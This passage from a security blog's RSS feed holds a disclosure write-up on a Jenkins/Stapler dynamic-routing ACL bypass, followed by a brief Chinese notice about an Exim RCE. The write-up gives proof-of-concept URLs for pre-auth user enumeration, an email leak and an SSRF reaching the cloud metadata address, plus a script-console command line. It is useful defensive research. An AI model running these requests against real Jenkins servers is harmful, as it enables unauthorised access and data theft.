&lt;p&gt;However, we are not going to discuss that in this article. Instead, this post is about another vulnerability found while digging into Stapler framework in order to find a way to bypass the least privilege requirement &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; of CVE-2018-1999002! If you merely take a look at the advisory description, you may be curious ‚Äì Is it reality to gain code execution with just a crafted URL?&lt;/p&gt;

&lt;p&gt;From my own perspective, this vulnerability is just an Access Control List(ACL) bypass, but because this is a problem of the architecture rather than a single program, there are various ways to exploit this bug! In order to pay off the design debt, Jenkins team also takes lots of efforts (patches in &lt;a href=&quot;https://github.com/jenkinsci/jenkins/commit/47f38d714c99e1841fb737ad1005618eb26ed852&quot;&gt;Jenkins side&lt;/a&gt; and &lt;a href=&quot;https://github.com/stapler/stapler/commit/28e8eba822a0df9dcd64d20eb63d8ab5f6ee2980&quot;&gt;Stapler side&lt;/a&gt;) to fix that. The patch not only introduces a new routing blacklist and whitelist but also extends the original &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Plugins+affected+by+the+SECURITY-595+fix&quot;&gt;Service Provider Interface (SPI)&lt;/a&gt; to protect Jenkins‚Äô routing. Now let‚Äôs figure out why Jenkins need to make such a huge code modification!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;review-scope&quot;&gt;Review Scope&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;This is not a complete code review (An overall security review takes lots of time‚Ä¶), so this review just aims at high impact bugs. The review scope includes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Jenkins Core&lt;/li&gt;
  &lt;li&gt;Stapler Web Framework&lt;/li&gt;
  &lt;li&gt;Suggested Plugins&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;During the installation, Jenkins asks whether you want to install suggested plugins such as Git, GitHub, SVN and Pipeline. Basically, most people choose yes, or they will get an inconvenient and hard-to-use Jenkins.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-levels&quot;&gt;Privilege Levels&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Because the vulnerability is an ACL bypass, we need to introduce the privilege level in Jenkins first! In Jenkins, there are different kinds of ACL roles, Jenkins even has a specialized plugin &lt;a href=&quot;https://plugins.jenkins.io/matrix-auth&quot;&gt;Matrix Authorization Strategy Plugin&lt;/a&gt;(also in the suggested plugin list) to configure the detailed permission per project. From an attacker‚Äôs view, we roughly classify the ACL into 3 types:&lt;/p&gt;

&lt;h3 id=&quot;1-full-access&quot;&gt;1. Full Access&lt;/h3&gt;

&lt;p&gt;You can fully control Jenkins. Once the attacker gets this permission, he can execute arbitrary Groovy code via &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;!&lt;/p&gt;
&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uname -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is the most hacker-friendly scenario, but it‚Äôs hard to see this configuration publicly now due to the increase of security awareness and lots of bots scanning all the IPv4.&lt;/p&gt;

&lt;h3 id=&quot;2-read-only-mode&quot;&gt;2. Read-only Mode&lt;/h3&gt;

&lt;p&gt;This can be enabled from the &lt;a href=&quot;http://jenkins.local/configureSecurity&quot;&gt;Configure Global Security&lt;/a&gt; and check the radio box:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Allow anonymous read access&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Under this mode, all contents are visible and readable. Such as agent logs and job/node information. For attackers, the best benefit of this mode is the accessibility of a bunch of private source codes! However, the attacker cannot do anything further or execute Groovy scripts!&lt;/p&gt;

&lt;p&gt;Although this is not the default setting, for DevOps, they may still open this option for automations. According to a little survey on &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt;, there are about 12% servers enabled this mode! We will call this mode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; in the following sections.&lt;/p&gt;

&lt;h3 id=&quot;3-authenticated-mode&quot;&gt;3. Authenticated Mode&lt;/h3&gt;

&lt;p&gt;This is the default mode. Without a valid credential, you can‚Äôt see any information! We will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; to call this mode in following sections.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;

&lt;p&gt;To explain this vulnerability, we will start with Jenkins‚Äô &lt;a href=&quot;https://jenkins.io/doc/developer/handling-requests/routing/&quot;&gt;Dynamic Routing&lt;/a&gt;. In order to provide developers more flexibilities, Jenkins uses a naming convention to resolve the URL and invoke the method dynamically. Jenkins first tokenizes all the URL by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, and begins from &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; as the entry point to match the token one by one. If the token matches (1)public class member or (2)public class method correspond to following naming conventions, Jenkins invokes recursively!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;()&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(String)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Int)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Long)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(StaplerRequest)&lt;/li&gt;
    &lt;li&gt;getDynamic(String, ‚Ä¶)&lt;/li&gt;
    &lt;li&gt;doDynamic(‚Ä¶)&lt;/li&gt;
    &lt;li&gt;do&amp;lt;token&amp;gt;(‚Ä¶)&lt;/li&gt;
    &lt;li&gt;js&amp;lt;token&amp;gt;(‚Ä¶)&lt;/li&gt;
    &lt;li&gt;Class method with @WebMethod annotation&lt;/li&gt;
    &lt;li&gt;Class method with @JavaScriptMethod annotation&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;It looks like Jenkins provides developers a lot of flexibility. However, too much freedom is not always a good thing. There are two problems based on this naming convention!&lt;/p&gt;

&lt;h3 id=&quot;1-everything-is-the-subclass-of-javalangobject&quot;&gt;1. Everything is the Subclass of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.lang.Object&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;In Java, everything is a subclass of &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html&quot;&gt;java.lang.Object&lt;/a&gt;. Therefore, all objects must exist the method - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt;, and the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; just matches the naming convention rule &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#1&lt;/code&gt;! So the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; can be also invoked during Jenkins dynamic routing!&lt;/p&gt;

&lt;h3 id=&quot;2-whitelist-bypass&quot;&gt;2. Whitelist Bypass&lt;/h3&gt;

&lt;p&gt;As mentioned before, the biggest difference between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; is, if the flag set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt;, the entry point will do one more check in &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java#L4682&quot;&gt;jenkins.model.Jenkins#getTarget()&lt;/a&gt;. The check is a white-list based URL prefix check and here is the list:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ALWAYS_READABLE_PATHS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/logout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/accessDenied&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/adjuncts/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/error&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/oops&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/signup&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/tcpSlaveAgentListener&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/federatedLoginService/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/securityRealm&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/instance-identity&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That means you are restricted to those entrances, but if you can find a cross reference from the white-list entrance jump to other objects, you can still bypass this URL prefix check! It seems a little bit hard to understand. Let‚Äôs give a simple example to demonstrate the dynamic routing:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above URL will invoke following methods in sequence!&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdjuncts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;whatever&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.jsp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This execution chain seems smooth, but sadly, it can not retrieve the result. Therefore, this is not a potential risk, but it‚Äôs still a good case to understand the mechanism!&lt;/p&gt;

&lt;p&gt;Once we realize the principle, the remaining part is like solving a maze. &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; is the entry point. Every member in this object can references to a new object, so our work is to chain the object layer by layer till the exit door, that is, the dangerous method invocation!&lt;/p&gt;

&lt;p&gt;By the way, the saddest thing is that this vulnerability cannot invoke the SETTER, otherwise this would definitely be another interesting classLoader manipulation bug just like &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-020&quot;&gt;Struts2 RCE&lt;/a&gt; and &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1622&quot;&gt;Spring Framework RCE&lt;/a&gt;!!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-exploit&quot;&gt;How to Exploit?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;How to exploit? In brief, the whole thing this bug can achieve is to use cross reference objects to bypass ACL policy. To leverage it, we need to find a proper gadget so that we can invoke the object we prefer in this object-forest more conveniently! Here we choose the gadget:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The gadget will invoke following methods sequencely.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSecurityRealm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDescriptorByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In Jenkins, all configurable objects will extend the type &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/Descriptor.java&quot;&gt;hudson.model.Descriptor&lt;/a&gt;. And, any class who extends the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Descriptor&lt;/code&gt; type is accessible by method &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/DescriptorByNameOwner.java#L51&quot;&gt;hudson.model.DescriptorByNameOwner#getDescriptorByName(String)&lt;/a&gt;. In general, there are totally about 500 class types can be accessed! But due to the architecture of Jenkins. Most developers will check the permission before the dangerous action again. So even we can find a object reference to the &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;, without the permission &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.RUN_SCRIPTS&lt;/code&gt;, we still can‚Äôt do anything :(&lt;/p&gt;

&lt;p&gt;Even so, this vulnerability can still be considered as a stepping stone to bypass the first ACL restriction and to chain other bugs. We will show 3 vulnerability-chains as our case study! (Although we just show 3 cases, there are more than 3! If you are intersted, it‚Äôs highly recommended to find others by yourself :P )&lt;/p&gt;

&lt;p&gt;P.S. It should be noted that in the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser([username])&lt;/code&gt;, it will invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getOrCreateById(...)&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create&lt;/code&gt; flag set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;True&lt;/code&gt;. This result to the creation of a temporary user in memory(which will be listed in the user list but can‚Äôt sign in). Although it‚Äôs harmless, it is still recognized as a security issue in &lt;a href=&quot;https://jenkins.io/security/advisory/2018-10-10/&quot;&gt;SECURITY-1128&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;1-pre-auth-user-information-leakage&quot;&gt;1. Pre-auth User Information Leakage&lt;/h3&gt;

&lt;p&gt;While testing Jenkins, it‚Äôs a common scenario that you want to perform a brute-force attack but you don‚Äôt know which account you can try(a valid credential can read the source at least so it‚Äôs worth to be the first attempt).&lt;/p&gt;

&lt;p&gt;In this situation, this vulnerability is useful!
Due to the lack of permission check on search functionality. By modifying the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keyword&lt;/code&gt; from a to z, an attacker can list all users on Jenkins!&lt;/p&gt;

&lt;h4 id=&quot;poc&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also, this vulnerability can be also chained with &lt;a href=&quot;https://jenkins.io/security/advisory/2017-10-11/#user-remote-api-disclosed-users-email-addresses&quot;&gt;SECURITY-514&lt;/a&gt; which reported by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ananthapadmanabhan S R&lt;/code&gt; to leak user‚Äôs email address! Such as:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/api/xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-chained-with-cve-2018-1000600-to-a-pre-auth-fully-responded-ssrf&quot;&gt;2. Chained with CVE-2018-1000600 to a Pre-auth Fully-responded SSRF&lt;/h3&gt;

&lt;p&gt;The next bug is &lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600&lt;/a&gt;, this bug is reported by &lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;Orange Tsai&lt;/a&gt;(Yes, it‚Äôs me :P). About this vulnerability, the official description is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CSRF vulnerability and missing permission checks in GitHub Plugin allowed capturing credentials&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It can extract any stored credentials with known credentials ID in Jenkins. But the credentials ID is a random UUID if there is no user-supplied value provided. So it seems impossible to exploit this?(Or if someone know how to obtain credentials ID, please tell me!)&lt;/p&gt;

&lt;p&gt;Although it can‚Äôt extract any credentials without known credentials ID, there is still another attack primitive - a fully-response SSRF! We all know how hard it is to exploit a Blind SSRF, so that‚Äôs why a fully-responded SSRF is so valuable!&lt;/p&gt;

&lt;h4 id=&quot;poc-1&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword
?apiUrl=http://169.254.169.254/%23
&amp;amp;login=orange
&amp;amp;password=tsai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-pre-auth-remote-code-execution&quot;&gt;3. Pre-auth Remote Code Execution&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;PLEASE DON‚ÄôT BULLSHIT, WHERE IS THE RCE!!!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In order to maximize the impact, I also find an &lt;strong&gt;INTERESTING&lt;/strong&gt; remote code execution can be chained with this vulnerability to a well-deserved pre-auth RCE! But it‚Äôs still on the responsible disclosure process. Please wait and see the Part 2! (Will be published on February 19th :P)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Here is my todo list which can make this vulnerability more perfect. If you find any of them please tell me, really appreciate it :P&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin&lt;/code&gt; object reference under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt;. If this can be done, it can bypass the ACL restriction of &lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002&lt;/a&gt; and &lt;a href=&quot;https://jenkins.io/security/advisory/2018-02-14/#SECURITY-705&quot;&gt;CVE-2018-6356&lt;/a&gt; to a indeed pre-auth arbitrary file reading!&lt;/li&gt;
  &lt;li&gt;Find another gadget to invoke the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getDescriptorByName(String)&lt;/code&gt; under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt;. In order to fix &lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-672&quot;&gt;SECURITY-672&lt;/a&gt;, Jenkins applies a &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java#L1026&quot;&gt;check&lt;/a&gt; on &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java&quot;&gt;hudson.model.User&lt;/a&gt; to ensure the least privilege &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.READ&lt;/code&gt;. So the original gadget will fail after Jenkins version 2.138.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Thanks Jenkins Security team especially Daniel Beck for the coordination and bug fixing! Here is the brief timeline:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;May 30, 2018 - Report vulnerabilities to Jenkins&lt;/li&gt;
  &lt;li&gt;Jun 15, 2018 - Jenkins patched the bug and assigned CVE-2018-1000600&lt;/li&gt;
  &lt;li&gt;Jul 18, 2018 - Jenkins patched the bug and assigned CVE-2018-1999002&lt;/li&gt;
  &lt;li&gt;Aug 15, 2018 - Jenkins patched the bug and assigned CVE-2018-1999046&lt;/li&gt;
  &lt;li&gt;Dec 05, 2018 - Jenkins patched the bug and assigned CVE-2018-1000861&lt;/li&gt;
  &lt;li&gt;Dec 20, 2018 - Report Groovy vulnerability to Jenkins&lt;/li&gt;
  &lt;li&gt;Jan 08, 2019 - Jenkins patched Groovy vulnerability and assigned CVE-2019-1003000, CVE-2019-1003001 and CVE-2019-1003002&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/</link>
                <guid>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en</guid>
                <pubDate>Wed, 16 Jan 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim ‰ªªÊÑè‰ª£Á¢ºÂü∑Ë°åÊºèÊ¥û (CVE-2018-6789)</title>
                <description>&lt;h2 id=&quot;ÂÖßÂÆπ&quot;&gt;ÂÖßÂÆπ&lt;/h2&gt;

&lt;p&gt;‰ªäÂπ¥ÊàëÂÄëÂêë Exim ÂõûÂ†±‰∫Ü‰∏ÄÂÄã‰ΩçÊñº base64 Ëß£Á¢ºÂáΩÂºèÁöÑÊ∫¢Âá∫ÊºèÊ¥ûÔºåÁ∑®ËôüÁÇ∫ &lt;strong&gt;CVE-2018-6789&lt;/strong&gt;„ÄÇÊ≠§ÊºèÊ¥ûÂæû Exim Â∞àÊ°àÈñãÂßãÊôÇÂç≥Â≠òÂú®ÔºåÂõ†Ê≠§&lt;strong&gt;ÂΩ±Èüø Exim ÁöÑÊâÄÊúâÁâàÊú¨&lt;/strong&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê†πÊìöÊàëÂÄëÁöÑÁ†îÁ©∂ÔºåÊîªÊìäËÄÖÂèØÂà©Áî®Ê≠§ÊºèÊ¥ûÈÅîÊàê&lt;strong&gt;ÈÅ†Á´Ø‰ªªÊÑè‰ª£Á¢ºÂü∑Ë°åÔºå‰∏¶‰∏î‰∏çÈúÄ‰ªª‰ΩïË™çË≠â&lt;/strong&gt;ÔºåËá≥Â∞ëÊúâ 40 Ëê¨Âè∞ Exim ‰º∫ÊúçÂô®ÂèóÊ≠§ÊºèÊ¥ûÂΩ±Èüø‰∏¶Â≠òÂú®Ë¢´ÊîªÊìäÁöÑÈ¢®Èö™„ÄÇÊàëÂÄëÂª∫Ë≠∞Á´ãÂç≥Â∞á Exim &lt;strong&gt;ÂçáÁ¥öËá≥ 4.90.1 Áâà&lt;/strong&gt;‰ª•ÂÖçÈÅ≠ÂèóÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Á¥∞ÁØÄ&quot;&gt;Á¥∞ÁØÄ&lt;/h2&gt;

&lt;p&gt;Ë©≥Á¥∞ÁöÑÊäÄË°ìÁ¥∞ÁØÄË´ãÂèÉÈñ±ÊàëÂÄëÁöÑ AdvisoryÔºö
&lt;a href=&quot;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&quot;&gt;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&lt;/a&gt;&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789/</link>
                <guid>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789</guid>
                <pubDate>Tue, 06 Mar 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim Off-by-one RCE: Exploiting CVE-2018-6789 with Fully Mitigations Bypassing</title>
